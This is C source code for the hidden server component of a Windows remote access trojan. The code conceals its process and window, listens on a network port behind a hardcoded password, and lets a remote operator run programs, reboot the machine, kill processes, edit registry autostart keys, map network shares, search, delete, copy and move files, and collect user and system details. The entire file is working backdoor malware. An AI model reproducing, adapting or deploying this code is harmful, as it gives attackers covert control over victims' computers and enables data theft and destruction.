#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>
#include "error.h"
#include "mystr.h"
#include "rat_types.h"
#include "diskfind.h"
#include "resource.h"

#define		RATMSG_SOCKET	WM_USER+1

unsigned short	ServerPort=1024;
HINSTANCE		_hInst;
HWND			_hWnd;
SOCKET			hSock;
SOCKET			Client;
SOCKADDR_IN		ServAdr;
WORD			Event;
int				AdrLen=sizeof(sockaddr);
PACKETHEAD		Head;
DWORD			HeadSize=sizeof(PACKETHEAD);
DWORD			FindFlags=DF_FILES|DF_USE_DIRS|DF_SDIRS_OVER|DF_RECURSE;
BOOL			IsHiddenAlready=0;
bool			WaitForPacket=0;
char			*RecvBuf;
char			OutBuf[1024];
char			*Run="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char			*RunOnce="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
char			*RunOnceEx="Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx";
char			*RunServices="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char			*RunServicesOnce="Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce";
char			*RegGrps[]={Run,RunOnce,RunOnceEx,RunServices,RunServicesOnce};
char			*LanMan="Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan";
HOOKPROC		hkprcSysMsg; 
static HINSTANCE hinstDLL; 
static HHOOK	hhookSysMsg; 
HANDLE			share;
DWORD			temp;


void SendFindResults(char* FullPath_with_FileName, char* FileName, char* LocalPath, char* FullPath)
{
	Head.PacketType=PACK_TYPE_DATA;
	wsprintf(OutBuf,"%s\t%s",FileName,FullPath);
	Head.DataSize=lstrlen(OutBuf)+1;
	send(Client,(char*)&Head,HeadSize,0);
	send(Client,OutBuf,Head.DataSize,0);
	return;
}

void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 ||
		 HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}

void InitSocket(HWND hwnd)
{
	hSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(hSock,hwnd,RATMSG_SOCKET,FD_ACCEPT|FD_READ|FD_CLOSE);
	ServAdr.sin_family=AF_INET;
	ServAdr.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdr.sin_port=htons(ServerPort);
	bind(hSock,(LPSOCKADDR)&ServAdr,sizeof(struct sockaddr));
	listen(hSock, 1);
}

void CloseSocket()
{
	closesocket(hSock);
	closesocket(Client);
	WSACleanup();
}

int HideProcess(HWND hwnd)
{
	DWORD (*pRegisterServiceProcess)(DWORD,DWORD);
	HINSTANCE hi=LoadLibrary("kernel32.dll");
	if(hi==NULL)
		return 0;
	else 
	{
		pRegisterServiceProcess=(DWORD(*)(DWORD,DWORD))GetProcAddress(hi,"RegisterServiceProcess");
		if(pRegisterServiceProcess==NULL)
		{
			FreeLibrary(hi);
			return 0;
		}
		else 
			if(pRegisterServiceProcess(GetCurrentProcessId(),1)==0) 
			{
				FreeLibrary(hi);
				return 0;
			}
    }
	FreeLibrary(hi);
	return 1;
}


void ParseData()
{
	char	buf_1[255];
	char	buf_2[255];
	DWORD	BufSize=255;
	switch(Head.PacketType)
	{
	case PACK_TYPE_SYNCHRO:
		if (lstrcmp(RecvBuf,"Password"))
			closesocket(Client);
		break;
	case PACK_TYPE_DATA:
		break;
	case PACK_TYPE_CMD_REBOOT:
		ExitWindowsEx(EWX_REBOOT,0);
		break;
	case PACK_TYPE_CMD_RUN:
		if  (WinExec(RecvBuf,SW_SHOWNORMAL)>31)
			wsprintf(OutBuf,"%s\tOK",RecvBuf);
		else
			wsprintf(OutBuf,"%s\tFail",RecvBuf);
		Head.PacketType=PACK_TYPE_DATA;
		Head.DataSize=lstrlen(OutBuf)+1;
		send(Client,(char*)&Head,HeadSize,0);
		send(Client,OutBuf,Head.DataSize,0);
		break;
	case PACK_TYPE_CMD_PROCLIST:
		{
			HANDLE snapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
			PROCESSENTRY32 proc={0};
			proc.dwSize=sizeof(PROCESSENTRY32);
			Process32First(snapshot,&proc);
			Head.PacketType=PACK_TYPE_DATA;
			wsprintf(OutBuf,"%10lu\t%s",proc.th32ProcessID,proc.szExeFile);
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,lstrlen(OutBuf)+1,0);
			proc.dwSize=sizeof(PROCESSENTRY32);
			while (Process32Next(snapshot,&proc))
			{
				Head.PacketType=PACK_TYPE_DATA;
				wsprintf(OutBuf,"%10lu\t%s",proc.th32ProcessID,proc.szExeFile);
				Head.DataSize=lstrlen(OutBuf)+1;
				send(Client,(char*)&Head,HeadSize,0);
				send(Client,OutBuf,lstrlen(OutBuf)+1,0);
				proc.dwSize=sizeof(PROCESSENTRY32);
			}
			CloseHandle(snapshot);
		}
		break;
	case PACK_TYPE_CMD_TERMINATE:
		{
			DWORD PrcID=atol(RecvBuf);
			if(TerminateProcess(OpenProcess(PROCESS_TERMINATE,0,PrcID),1))
				wsprintf(OutBuf,"Termination of %s\tOK",RecvBuf);
			else
				wsprintf(OutBuf,"Termination of %s\tFail",RecvBuf);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		}
		break;
	case PACK_TYPE_CMD_REGLIST:
		{
			HKEY	RegKey;
			DWORD	idx=0;
			DWORD	Type;
			DWORD	Size=255,Size2=255;
//			char	buf_name[255];
//			char	buf_val[255];
			for (int cnt=0; cnt<4; cnt++)
			{
				idx=0;
				RegOpenKeyEx(HKEY_LOCAL_MACHINE,RegGrps[cnt],0,KEY_ALL_ACCESS,&RegKey);
				while(RegEnumValue(RegKey,idx,(char*)&buf_1[0],&Size,0,&Type,(BYTE*)&buf_2[0],&Size2)!=ERROR_NO_MORE_ITEMS)
				{
					idx++;
					wsprintf(OutBuf,"%s\\%s\t%s",RegGrps[cnt],buf_1,buf_2);
					Head.PacketType=PACK_TYPE_DATA;
					Head.DataSize=lstrlen(OutBuf)+1;
					send(Client,(char*)&Head,HeadSize,0);
					send(Client,OutBuf,lstrlen(OutBuf)+1,0);
					Size=255;
					Size2=255;
				}
				RegCloseKey(RegKey);
			}
		}
		break;
	case PACK_TYPE_CMD_REGDELETE:
		{
			HKEY	RegKey;
//			char	buf[255];
			DWORD	pos=GetCharPos(RecvBuf,'\\',DOWN);
			strncpy(buf_1,RecvBuf,pos+1);
			buf_1[pos+1]=0;
			PanString(RecvBuf,pos+1);
			RegOpenKeyEx(HKEY_LOCAL_MACHINE,buf_1,0,KEY_ALL_ACCESS,&RegKey);
			if (RegDeleteValue(RegKey,RecvBuf)==ERROR_SUCCESS)
				wsprintf(OutBuf,"Registry key delete (%s)\tOK",lstrcat(buf_1,RecvBuf));
			else
				wsprintf(OutBuf,"Registry key delete (%s)\tFail",lstrcat(buf_1,RecvBuf));
			RegCloseKey(RegKey);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		}
		break;
	case PACK_TYPE_CMD_REGADD:
		{
//			char	buf_1[255];
//			char	buf_2[100];
			DWORD	TopKey;
			int		pos;
			HKEY	RegKey;
			TopKey=atol(RecvBuf);
			PanString(RecvBuf,GetCharPos(RecvBuf,'\t',UP)+1);
			pos=GetCharPos(RecvBuf,'\t',UP);
			strncpy(buf_1,RecvBuf,pos);
			buf_1[pos]=0;
			PanString(RecvBuf,pos+1);
			pos=GetCharPos(RecvBuf,'\t',UP);
			strncpy(buf_2,RecvBuf,pos);
			buf_2[pos]=0;
			PanString(RecvBuf,pos+1);
			if(RegOpenKeyEx((HKEY)TopKey,buf_1,0,KEY_ALL_ACCESS,&RegKey)!=ERROR_SUCCESS)
				wsprintf(OutBuf,"Set key value (%s\\%s=%s)\tFail",buf_1,buf_2,RecvBuf);
			else
			if (RegSetValueEx(RegKey,buf_2,0,REG_SZ,(BYTE*)RecvBuf,lstrlen(RecvBuf))!=ERROR_SUCCESS)
				wsprintf(OutBuf,"Set key value (%s\\%s=%s)\tFail",buf_1,buf_2,RecvBuf);
			else
				wsprintf(OutBuf,"Set key value (%s\\%s=%s)\tOK",buf_1,buf_2,RecvBuf);
			RegCloseKey(RegKey);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		} break;
	case PACK_TYPE_CMD_SHOWSHARED:
		{
			HKEY	RegKey,ShareKey;
			DWORD	idx=0;
			DWORD	Size=255;
			DWORD	Type;
			RegOpenKeyEx(HKEY_LOCAL_MACHINE,LanMan,0,KEY_ALL_ACCESS,&RegKey);
			while(RegEnumKey(RegKey,idx,buf_1,255)!=ERROR_NO_MORE_ITEMS)
			{
				wsprintf(buf_2,"%s\\%s",LanMan,buf_1);
				RegOpenKeyEx(HKEY_LOCAL_MACHINE,buf_2,0,KEY_ALL_ACCESS,&ShareKey);
				RegQueryValueEx(ShareKey,"Path",0,&Type,(BYTE*)&buf_2[0],&Size);
				wsprintf(OutBuf,"%s\t%s",buf_1,buf_2);
				Head.PacketType=PACK_TYPE_DATA;
				Head.DataSize=lstrlen(OutBuf)+1;
				send(Client,(char*)&Head,HeadSize,0);
				send(Client,OutBuf,Head.DataSize,0);
				idx++;
				RegCloseKey(ShareKey);
			}
			RegCloseKey(RegKey);
		}
		break;
	case PACK_TYPE_CMD_CONNDRIVE:
		{
			bool		FoundFreeDrive=0;
			int			pos=GetCharPos(RecvBuf,'\t',UP)+1;
			char		drv[5];
			NETRESOURCE	nr={0};
			nr.dwType=RESOURCETYPE_DISK;
			strncpy(buf_1,RecvBuf,pos);
			buf_1[pos-1]=0;
			PanString(RecvBuf,pos);
			pos=GetCharPos(RecvBuf,'\t',UP);
			strncpy(buf_2,RecvBuf,pos);
			buf_2[pos]=0;
			PanString(RecvBuf,pos+1);
			nr.lpRemoteName=buf_1;
			for (int a='C'; a<'Z'; a++)
			{
				wsprintf(drv,"%c:\\",a);
				if (GetDriveType(drv)<=1)
				{
					drv[2]=0;
					FoundFreeDrive^=1;
					nr.lpLocalName=drv;
					if (WNetAddConnection2(&nr,buf_2,RecvBuf,0)==NO_ERROR)
						wsprintf(OutBuf,"Dirve connection (%s->%s)\tOK",buf_1,drv);
					else
						wsprintf(OutBuf,"Dirve connection (%s->%s)\tFail",buf_1,drv);
					break;
				}
			}
			if (!FoundFreeDrive)
				wsprintf(OutBuf,"Dirve connection (%s->%s)\tFail",buf_1,drv);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		}
		break;
	case PACK_TYPE_CMD_SHOWCONN:
		{
			HANDLE hConnectedEnum;
			NETRESOURCE	nr[1024];
			DWORD		NetSize=32768;
			DWORD		NetCount=1024;
			WNetOpenEnum(RESOURCE_CONNECTED,RESOURCETYPE_DISK,0,nr,&hConnectedEnum);
			DWORD		EnumCode=WNetEnumResource(hConnectedEnum,&NetCount,nr,&NetSize);
			if (EnumCode==NO_ERROR)
			{
				for (int cnt=0; cnt<NetCount; cnt++)
				{
					wsprintf(OutBuf,"%s\t%s",nr[cnt].lpRemoteName,nr[cnt].lpLocalName);
					Head.PacketType=PACK_TYPE_DATA;
					Head.DataSize=lstrlen(OutBuf)+1;
					send(Client,(char*)&Head,HeadSize,0);
					send(Client,OutBuf,Head.DataSize,0);
				}
			}
			WNetCloseEnum(hConnectedEnum);
		}
		break;
	case PACK_TYPE_CMD_DISCONNDRV:
		if (WNetCancelConnection2(RecvBuf,0,TRUE)==NO_ERROR)
			wsprintf(OutBuf,"Disconnection of drive (%s)\tOK",RecvBuf);
		else
			wsprintf(OutBuf,"Disconnection of drive (%s)\tFail",RecvBuf);
		Head.PacketType=PACK_TYPE_DATA;
		Head.DataSize=lstrlen(OutBuf)+1;
		send(Client,(char*)&Head,HeadSize,0);
		send(Client,OutBuf,Head.DataSize,0);
		break;
	case PACK_TYPE_CMD_FIND:
		{
			DF_FileFunctor=(DWORD)SendFindResults;
			DF_SDirFunctor=0;
			DWORD	pos=GetCharPos(RecvBuf,'\\',DOWN);
			strncpy(buf_1,RecvBuf,pos);
			buf_1[pos]=0;
			PanString(RecvBuf,pos+1);
			DiskFind(buf_1,RecvBuf,FindFlags);
			break;
		}
	case PACK_TYPE_CMD_DELETE:
		if (DeleteFile(RecvBuf))
			wsprintf(OutBuf,"Delete file %s\tOK",RecvBuf);
		else
			wsprintf(OutBuf,"Delete file %s\tFail",RecvBuf);
		Head.PacketType=PACK_TYPE_DATA;
		Head.DataSize=lstrlen(OutBuf)+1;
		send(Client,(char*)&Head,HeadSize,0);
		send(Client,OutBuf,Head.DataSize,0);
		break;
	case PACK_TYPE_CMD_COPY:
		{
			DWORD	pos=GetCharPos(RecvBuf,'\t',UP);
			strncpy(buf_1,RecvBuf,pos);
			buf_1[pos]=0;
			PanString(RecvBuf,pos+1);
			if (CopyFile(buf_1,RecvBuf,FALSE))
				wsprintf(OutBuf,"Copy file %s to %s\tOK",buf_1,RecvBuf);
			else
				wsprintf(OutBuf,"Copy file %s to %s\tFail",buf_1,RecvBuf);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		}
		break;
	case PACK_TYPE_CMD_MOVE:
		{
			DWORD	pos=GetCharPos(RecvBuf,'\t',UP);
			strncpy(buf_1,RecvBuf,pos);
			buf_1[pos]=0;
			PanString(RecvBuf,pos+1);
			if (MoveFile(buf_1,RecvBuf))
				wsprintf(OutBuf,"Move file %s to %s\tOK",buf_1,RecvBuf);
			else
				wsprintf(OutBuf,"Move file %s to %s\tFail",buf_1,RecvBuf);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
		}
		break;
	case PACK_TYPE_CMD_SYSINFO:
		{
			bool	skipflag=0;
			for (char drv='A'; drv<='Z'; drv++)
			{
				buf_1[0]=drv;
				buf_1[1]=':';
				buf_1[2]='\\';
				switch(GetDriveType(buf_1))
				{
				case DRIVE_REMOVABLE:
					wsprintf(OutBuf,"%s\tRemovable",buf_1);
					break;
				case DRIVE_FIXED:
					wsprintf(OutBuf,"%s\tFixed",buf_1);
					break;
				case DRIVE_REMOTE:
					wsprintf(OutBuf,"%s\tRemote",buf_1);	
					break;
				case DRIVE_CDROM:
					wsprintf(OutBuf,"%s\tCD-ROM",buf_1);
					break;
				case DRIVE_RAMDISK:
					wsprintf(OutBuf,"%s\tRAM-drive",buf_1);
					break;
				case DRIVE_NO_ROOT_DIR:
				case DRIVE_UNKNOWN:
					skipflag=1;			
					break;
				}
				if (!skipflag)
				{
					Head.PacketType=PACK_TYPE_DATA;
					Head.DataSize=lstrlen(OutBuf)+1;
					send(Client,(char*)&Head,HeadSize,0);
					send(Client,OutBuf,Head.DataSize,0);
				}
				else skipflag^=skipflag;
			}
			GetWindowsDirectory(buf_1,255);
			wsprintf(OutBuf,"Windows at\t%s",buf_1);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
			OSVERSIONINFO vi;
			vi.dwOSVersionInfoSize=sizeof(vi);
			GetVersionEx(&vi);
			wsprintf(OutBuf,"System version\t%lu.%lu.%lu",vi.dwMajorVersion,vi.dwMinorVersion,vi.dwBuildNumber);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
			switch(vi.dwPlatformId)
			{
			case VER_PLATFORM_WIN32s:
				wsprintf(OutBuf,"Working on\tWINDOWS 3.11 (Win32s)");
				break;
			case VER_PLATFORM_WIN32_WINDOWS:
				wsprintf(OutBuf,"Working on\tWINDOWS 95");
				break;
			case VER_PLATFORM_WIN32_NT:
				wsprintf(OutBuf,"Working on\tWINDOWS NT");
				break;
			}
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
			GetUserName(buf_1,&BufSize);
			wsprintf(OutBuf,"Current user\t%s",buf_1);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
			BufSize=17;
			GetComputerName(buf_1,&BufSize);
			wsprintf(OutBuf,"Computer name\t%s",buf_1);
			Head.PacketType=PACK_TYPE_DATA;
			Head.DataSize=lstrlen(OutBuf)+1;
			send(Client,(char*)&Head,HeadSize,0);
			send(Client,OutBuf,Head.DataSize,0);
			BufSize=255;
		}
	}
	GlobalFree(RecvBuf);
}

LRESULT CALLBACK MainWndProc(HWND hwnd,UINT Mes,UINT wPar,LONG lPar)
{
	switch (Mes)
	{
	case WM_INITDIALOG:
		HideProcess(hwnd);
		InitWSA();	
		InitSocket(hwnd);
		return true;
		break;
	case WM_PAINT: 
		if (!IsHiddenAlready)
		{
			ShowWindow(hwnd,SW_HIDE);
			IsHiddenAlready^=1;
		}
		break;
	case WM_COMMAND:
		switch(LOWORD(wPar))
		{
		case ID_START:
			break;
		}
		break;
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lPar);
		switch(Event)
		{
		case FD_CLOSE:
			closesocket(Client);
			WaitForPacket=0;
			break;
		case FD_ACCEPT:
			Client=accept(hSock,(LPSOCKADDR)&ServAdr,&AdrLen);
			Head.PacketType=PACK_TYPE_SYNCHRO;
			Head.DataSize=SYNCHRO_SIGN;
			send(Client,(char*)&Head,HeadSize,0);
			break;
		case FD_READ:
			if (!WaitForPacket)
			{
				recv(Client,(char*)&Head,HeadSize,0);
				if (Head.DataSize)
					WaitForPacket^=1;
			}
			else
			{
				RecvBuf=(char*)GlobalAlloc(GMEM_FIXED,Head.DataSize);
				recv(Client,RecvBuf,Head.DataSize,0);
				ParseData();
				WaitForPacket^=1;
			}
			break;
		} break;
	case WM_QUIT:
		UnhookWindowsHookEx(hhookSysMsg);
		FreeLibrary(hinstDLL);
		break;
	case WM_DESTROY:
		UnhookWindowsHookEx(hhookSysMsg);
		FreeLibrary(hinstDLL);
		break;
	case WM_SYSCOMMAND:
		switch (wPar)
        {
        case SC_CLOSE:
			bool a=UnhookWindowsHookEx(hhookSysMsg);
			a=FreeLibrary(hinstDLL);
			CloseSocket();
            PostQuitMessage(0);
            break;
        } break;
	}
	return false;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev,
				   LPSTR lpszParam, int nCmdShow)
{
	InitCommonControls();
	_hInst=hInst;
	DialogBox(hInst,"EMPTYWINDOW",0,(DLGPROC)MainWndProc);
	return 0;
}